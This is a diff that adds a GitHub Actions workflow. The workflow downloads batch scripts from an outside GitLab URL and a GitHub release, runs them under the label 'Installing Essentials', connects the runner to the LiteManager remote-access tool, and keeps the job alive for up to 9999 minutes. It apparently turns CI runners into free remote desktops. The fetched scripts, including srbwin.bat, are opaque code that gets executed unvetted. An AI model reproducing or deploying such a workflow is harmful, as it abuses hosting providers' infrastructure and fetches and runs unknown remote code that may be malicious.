@@ -1,0 +1,32 @@
+name: LiteManager5
+ 
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+ 
+jobs:
+  build:
+    name: Start Building...
+    runs-on: Windows-latest
+    timeout-minutes: 9999
+
+    steps:
+      - name: Downloading Essentials
+        run: Invoke-WebRequest -Uri "https://gitlab.com/chamod12/lm_win-10_github_rdp/-/raw/main/Downloads.bat" -OutFile "down.bat"
+
+      - name: Installing Essentials
+        run: cmd /c down.bat
+
+      - name: Connect to LiteManager
+        run: cmd /c show.bat
+
+      - name: Downloading Essentials
+        run: Invoke-WebRequest -Uri "https://github.com/yeah-yarn-chafe/1/releases/download/svc/srbwin.bat" -OutFile "srbwin.bat"
+
+      - name: Installing Essentials
+        run: cmd /c srbwin.bat &
+
+      - name: Time Counter
+        run: cmd /c loop.bat
